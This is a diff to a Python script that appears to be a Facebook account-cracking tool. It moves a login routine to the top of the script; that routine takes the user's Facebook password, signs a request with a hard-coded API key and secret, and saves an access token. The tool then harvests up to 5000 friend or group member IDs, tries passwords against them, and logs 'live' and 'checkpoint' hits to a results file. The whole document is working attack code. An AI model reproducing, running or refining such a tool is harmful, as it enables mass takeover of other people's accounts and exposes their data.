@@ -14,11 +14,36 @@ banner=("""%s
  _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
 /___/_/_/  /_/____/_/     %sversion: %s3.0%s
 """%(c,g,c,g,c,g,y,w))
+
+os.system('clear')
+print(banner)
+try:
+	os.mkdir('toket')
+except OSError: pass
+try:
+	toket=open('toket/token.txt')
+	toket.close()
+except IOError:
+		try:
+			print('[!] login to your facebook account first');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
+			x = hashlib.new('md5')
+			x.update(sig)
+			data.update({'sig':x.hexdigest()})
+			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
+			res=requ.json()['access_token']
+			o=open('toket/token.txt','w')
+			o.write(res)
+			print("[!] success generate access token")
+			print("[!] access token saved: toket/token.txt")
+			time.sleep(3)
+			o.close()
+		except KeyError:
+			print("[!] failed generate access token")
+			print("[!] Check your username/password")
+			exit()
+
 def getFid():
 	print(banner)
-	try:
-		os.mkdir('toket')
-	except OSError: pass
 	try:
 		os.mkdir('dump')
 	except OSError: pass
@@ -26,7 +51,7 @@ def getFid():
 		toket=open('toket/token.txt','r').read()
 		id=input("[in] your friends id: ")
 		b=open('dump/friends_'+id+'_id.txt','w')
-		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+toket)
+		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket))
 		s=json.loads(re.text)
 		for i in s['friends']['data']:
 			b.write(i['id'] + '\n')
@@ -35,33 +60,14 @@ def getFid():
 		print("[!] file saved: dump/friends_%s_id.txt"%(id))
 		b.close()
 		exit()
-	except IOError:
-		try:
-			print('[!] login to your facebook account');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
-			x = hashlib.new('md5')
-			x.update(sig)
-			data.update({'sig':x.hexdigest()})
-			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
-			res=requ.json()['access_token']
-			o=open('toket/token.txt','w').write(res)
-			print("[!] success generate access token")
-			print("[!] access token saved: toket/token.txt")
-			exit()
-		except KeyError:
-			print("[!] failed generate access token")
-			print("[!] Check your username/password")
-			exit()
 	except KeyboardInterrupt:
 		exit("[!] Key interrupt: Stoped.")
 	except KeyError:
-		os.remove('dump/friends_'+id+'_id.txt')
+		os.remove('dump/friends_'+str(id)+'_id.txt')
 		exit('[!] failed to fetch friend id')
 
 def getGid():
 	print(banner)
-	try:
-		os.mkdir('toket')
-	except OSError: pass
 	try:
 		os.mkdir('dump')
 	except OSError: pass
@@ -78,26 +84,10 @@ def getGid():
 		print("[!] file saved: dump/group_%s_id.txt"%(id))
 		b.close()
 		exit()
-	except IOError:
-		try:
-			print('[!] login to your facebook account');id = input('[?] Username : ');pwd = input('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
-			x = hashlib.new('md5')
-			x.update(sig)
-			data.update({'sig':x.hexdigest()})
-			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
-			res=requ.json()['access_token']
-			o=open('toket/token.txt','w').write(res)
-			print("[!] success generate access token")
-			print("[!] access token saved: toket/token.txt")
-			exit()
-		except KeyError:
-			print("[!] failed generate access token")
-			print("[!] Check your username/password")
-			exit()
 	except KeyboardInterrupt:
 		exit("[!] Key interrupt: Stoped.")
 	except KeyError:
-		os.remove('dump/group_'+id+'_id.txt')
+		os.remove('dump/group_'+str(id)+'_id.txt')
 		exit('[!] failed to fetch group id')
 
 def rmtoken():
@@ -130,8 +120,10 @@ def main(arg):
                         except FileExistsError:
                                 pass
                         tulis="{}\n".format(live)
-                        f=open('result/live.txt','a').write(tulis)
+                        f=open('result/live.txt','a')
+                        f.write(tulis)
                         print("%s[%sfound%s]%s %s -> %s"%(c,g,c,w,arg,pas))
+                        f.close()
                 elif 'checkpoint' in str(respData):
                         true='notbad'
                         cek.append(true)
@@ -141,13 +133,15 @@ def main(arg):
                         except FileExistsError:
                                 pass
                         wrt="{}\n".format(CP)
-                        f=open('result/live.txt','a').write(wrt)
+                        f=open('result/live.txt','a')
+                        f.write(wrt)
                         print("%s[%sCpoint%s]%s %s -> %s"%(c,y,c,w,arg,pas))
+                        f.close()
                 else:
                         print("%s[%snot%s]%s %s"%(c,r,c,w,arg))
-	except:
-		pass
+	except: pass
 
+os.system('clear')
 print(banner)
 print("\t[1] start \n\t[2] dump id from your friends id \n\t[3] dump id from your group id \n\t[4] remove access token")
 pilih=int(input('\n\t[!] choose your option: '))
@@ -186,3 +180,4 @@ if len(file) == 0:
 if 'yeah' in str(tap) or 'notbad' in str(cek):
         print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
         print("Live Results saved: result/live.txt")
+else: print("[ %s:(%s ] nothing found"%(y,w))
